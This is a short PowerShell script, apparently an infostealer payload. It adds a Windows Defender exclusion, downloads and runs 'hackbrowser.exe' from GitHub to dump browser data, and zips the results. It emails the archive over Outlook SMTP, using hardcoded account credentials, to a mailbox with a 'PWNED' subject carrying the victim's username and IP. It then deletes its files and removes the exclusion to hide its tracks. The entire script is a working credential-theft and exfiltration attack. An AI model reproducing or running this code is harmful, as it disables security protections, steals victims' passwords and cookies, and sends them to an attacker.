#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\dump"
Set-Location "$env:appdata\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest -Uri "https://github.com/isppilslowispp/Aslclripysa/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\pybw.exe"
./pybw.exe
Start-Sleep -Seconds 6
Remove-Item -Path "$env:appdata\dump\pybw.exe" -Force
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random
#Mailing the output you will need to enable less secure app access on your google account for this to work
$Message = new-object Net.Mail.MailMessage
$smtp = new-object Net.Mail.SmtpClient("smtp-mail.outlook.com", 587)
$smtp.Credentials = New-Object System.Net.NetworkCredential("aslclrisppilsl@hotmail.com", "@slclrisppilsl@@");
$smtp.EnableSsl = $true
$Message.From = "aslclrisppilsl@hotmail.com"
$Message.To.Add("aslclrisppilsl@hotmail.com")
$ip = Invoke-RestMethod "myexternalip.com/raw"
$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$Message.Body = $ComputerName
$files=Get-ChildItem 
$Message.Attachments.Add("$env:appdata\dump\dump.zip")
$smtp.Send($Message)
$Message.Dispose()
$smtp.Dispose()
#Cleanup
Start-Sleep -Seconds 6
cd "$env:appdata"
Remove-Item -Path "$env:appdata\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"


